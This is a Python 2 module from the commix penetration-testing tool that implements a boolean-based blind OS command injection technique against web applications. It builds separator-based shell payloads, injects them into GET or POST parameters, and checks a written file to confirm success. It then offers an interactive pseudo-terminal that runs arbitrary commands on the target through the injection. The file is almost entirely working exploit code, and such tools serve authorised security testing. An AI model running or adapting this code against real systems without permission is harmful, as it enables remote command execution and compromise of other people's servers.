#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

"""
 The "boolean-based" (a.k.a "TRUE / FALSE") injection technique on Blind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

def exploitation(url,delay,filename):
  
  counter = 0
  vp_flag = True
  no_result = True
  injection_type = "Blind-based Command Injection"
  technique = "boolean-based injection technique"
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
  
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print colors.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET

  # Check if defined "--prefix" option.
  if menu.options.prefix:
    print colors.RED + "(x) Error: The '--prefix' option is not available in "+ technique +"!" + colors.RESET
    
  # Check if defined "--suffix" option.
  if menu.options.suffix:
    print colors.RED + "(x) Error: The '--suffix' option is not available in "+ technique +"!" + colors.RESET

  sys.stdout.write( "(*) Testing the "+ technique +"... ")
  sys.stdout.flush()
  
  for seperator in settings.SEPERATORS:
    # Change TAG on every request to prevent false-positive resutls.
    TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
    
    # Check if defined "--base64" option.
    if menu.options.base64_trick == True:
      B64_ENC_TAG = base64.b64encode(TAG)
      B64_DEC_TRICK = settings.B64_DEC_TRICK
    else:
      B64_ENC_TAG = TAG
      B64_DEC_TRICK = ""
      
    # The output file for boolean-based injection technique.
    OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
    
    try:	  
      if seperator == ";" :
	payload = (seperator + " "
	  "if true " + seperator + " "
	  "then echo " + B64_ENC_TAG + " "+ B64_DEC_TRICK +"> " + OUTPUT_TEXTFILE + " " + seperator + " "
	  "fi"
	  )
	
      if seperator == "&&" :
	seperator = urllib.quote(seperator)
	payload = (seperator + " "
	  "true ; "
	  "echo " + B64_ENC_TAG + " "+ B64_DEC_TRICK +"> " + OUTPUT_TEXTFILE + " "
	  )
	
      if seperator == "|" :
	payload = (seperator + " "
	  "false " + seperator + seperator + " "
	  "echo " + B64_ENC_TAG + " "+ B64_DEC_TRICK +"> " + OUTPUT_TEXTFILE + " "
	  )
	
      if seperator == "||" :
	payload = (seperator + " "
	  "true | "
	  "echo " + B64_ENC_TAG + " "+ B64_DEC_TRICK +"> " + OUTPUT_TEXTFILE + " "
	  )
		
      # Check if defined "--verbose" option.
      if menu.options.verbose:
	sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
	
      # Check if defined method is GET (Default).
      if menu.options.method == "GET":
	
	# Check if its not specified the 'INJECT_HERE' tag
	url = parameters.do_GET_check(url)
	
	# Define the vulnerable parameter
	if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
	  vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
	  vuln_parameter = ''.join(vuln_parameter)
	  
	elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
	  vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
	  vuln_parameter = ''.join(vuln_parameter)
	  
	else:
	  vuln_parameter = url

	payload = urllib.quote(payload)
	target = re.sub(settings.INJECT_TAG, payload, url)
	request = urllib2.Request(target)
	
	# Check if defined extra headers.
	headers.do_check(request)

	# Check if defined any HTTP Proxy.
	if menu.options.proxy:
	  try:
	    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	    opener = urllib2.build_opener(proxy)
	    urllib2.install_opener(opener)
	    response = urllib2.urlopen(request)

	  except urllib2.HTTPError, err:
	    print "\n(x) Error : " + str(err)
	    sys.exit(1) 
    
	else:
	  response = urllib2.urlopen(request)
	  
      else :
	# Check if defined method is POST.
	parameter = menu.options.parameter
	parameter = urllib2.unquote(parameter)
	
	# Check if its not specified the 'INJECT_HERE' tag
	parameter = parameters.do_POST_check(parameter)
	
	payload = urllib.quote(payload)
	data = re.sub(settings.INJECT_TAG, payload, parameter)
	
	# Define the vulnerable parameter
	if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
	  vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
	  vuln_parameter = ''.join(vuln_parameter)
	  
	elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
	  vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
	  vuln_parameter = ''.join(vuln_parameter)
	  
	else:
	  vuln_parameter = parameter
	  
	request = urllib2.Request(url, data)
	
	# Check if defined extra headers.
	headers.do_check(request)
	  
	# Check if defined any HTTP Proxy.
	if menu.options.proxy:
	  try:
	    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	    opener = urllib2.build_opener(proxy)
	    urllib2.install_opener(opener)
	    response = urllib2.urlopen(request)
	    		    
	  except urllib2.HTTPError, err:
	    print "\n(x) Error : " + str(err)
	    sys.exit(1) 
    
	else:
	  response = urllib2.urlopen(request)
      
      # Find the directory.
      path = url
      path_parts = path.split('/')
      count = 0
      for part in path_parts:	
	count = count + 1
      count = count - 1
      last_param = path_parts[count]
      output = url.replace(last_param,OUTPUT_TEXTFILE)
      time.sleep(delay)
      
      try:
	output = urllib2.urlopen(output)
	html_data = output.read()
	
      except urllib2.HTTPError, e:
	  if e.getcode() == 404:
	    continue
	  
      except urllib2.URLError, e:
	  print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
	  sys.exit(0)

      shell = re.findall(r""+TAG+"", html_data)

    except:	
      continue
    
    if shell:
      found = True
      no_result = False
      
      if menu.options.method == "GET":
  
	# Print the findings to log file
	if vp_flag == True:
	  output_file = open(filename + ".txt", "a")
	  output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + menu.options.method + ")")
	  output_file.write("\n---\n")
	  vp_flag = False
	  output_file.close()
	  
	counter = counter + 1
	output_file = open(filename + ".txt", "a")
	output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	output_file.close()
	  
	# Print the findings to terminal.
	print colors.BOLD + "\n(!) The ("+ menu.options.method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + urllib2.unquote(payload) + colors.RESET + "\n"
	
      else :
	
	# Print the findings to log file
	if vp_flag == True:
	  output_file = open(filename + ".txt", "a")
	  output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + menu.options.method + ")")
	  output_file.write("\n---\n")
	  vp_flag = False
	  output_file.close()
	  
	counter = counter + 1
	output_file = open(filename + ".txt", "a")
	output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	output_file.close()
	  
	# Print the findings to terminal.
	print colors.BOLD + "\n(!) The ("+ menu.options.method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + urllib2.unquote(payload) + colors.RESET + "\n"
	
      gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
      
      if gotshell == "Y" or gotshell == "y":
	print ""
	print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	
	while True:
	  try:
	    cmd = raw_input("Shell > ")
	    
	    if cmd == "q":
	      sys.exit(0)
	      
	    else:
	      
	      if seperator == ";" :
		payload = (seperator + " "
		  "if true " + seperator + " "
		  "then $(echo " + cmd + ") > " + OUTPUT_TEXTFILE + seperator + " "
		  "fi" + seperator + " "
		  )

	      if seperator == urllib.quote("&&") :
		payload = (seperator + " "
		  "true ; "
		  "$(echo " + cmd + ") > " + OUTPUT_TEXTFILE + " "
		  )
		
	      if seperator == "|" :
		payload = (seperator + " "
		  "false " + seperator + seperator + " "
		  "$(echo " + cmd + ") > " + OUTPUT_TEXTFILE + " "
		  )
		
	      if seperator == "||" :
		payload = (seperator + " "
		  "true | "
		  "$(echo " + cmd + ") > " + OUTPUT_TEXTFILE + " "
		  )
		
	      # Check if defined "--verbose" option.
	      if menu.options.verbose:
		sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		
	      # Check if defined method is GET (Default).
	      if menu.options.method == "GET":
		
		# Check if its not specified the 'INJECT_HERE' tag
		url = parameters.do_GET_check(url)
		
		payload = urllib.quote(payload)
		target = re.sub(settings.INJECT_TAG, payload, url)
		vuln_parameter = ''.join(vuln_parameter)
		request = urllib2.Request(target)
		
		# Check if defined extra headers.
		headers.do_check(request)
		  
		# Check if defined any HTTP Proxy.
		if menu.options.proxy:
		  try:
		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		    opener = urllib2.build_opener(proxy)
		    urllib2.install_opener(opener)
		    response = urllib2.urlopen(request)
		    		    
		    
		  except urllib2.HTTPError, err:
		    print "\n(x) Error : " + str(err)
		    sys.exit(1) 
	    
		else:
		  response = urllib2.urlopen(request)
		  
	      # Check if defined method is POST.
	      else :
		parameter = menu.options.parameter
		parameter = urllib2.unquote(parameter)
		payload = urllib.quote(payload)
		
		# Check if its not specified the 'INJECT_HERE' tag
		parameter = parameters.do_POST_check(parameter)
		
		data = re.sub(settings.INJECT_TAG, payload, parameter)
		request = urllib2.Request(url, data)
		
		# Check if defined extra headers.
		headers.do_check(request)

		# Check if defined any HTTP Proxy.
		if menu.options.proxy:
		  try:
		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
		    opener = urllib2.build_opener(proxy)
		    urllib2.install_opener(opener)
		    response = urllib2.urlopen(request)
		    		     
		  except urllib2.HTTPError, err:
		    print "\n(x) Error : " + str(err)
		    sys.exit(1) 
	    
		else:
		  response = urllib2.urlopen(request)
	      
	      path = url
	      path_parts = path.split('/')
	      count = 0
	      
	      for part in path_parts:	
		count = count + 1

	      count = count - 1
	      last_param = path_parts[count]
	      output = url.replace(last_param, OUTPUT_TEXTFILE)
	      time.sleep(delay)
			      
	      try:
		output = urllib2.urlopen(output)
		html_data = output.read()
		
	      except urllib2.HTTPError, e:
		  if e.getcode() == 404:
		    continue
		
	      except urllib2.URLError, e:
		  pass
		
	      shell = re.findall(r"(.*)", html_data)
	      
	      if shell:	
		shell = " ".join(str(p) for p in shell)
		print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
		
	      
	  except KeyboardInterrupt: 
	    print ""
	    sys.exit(0)
	
      else:
	pass

  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
      return False

    else:
      print ""
      return False
  
  else :
    print ""
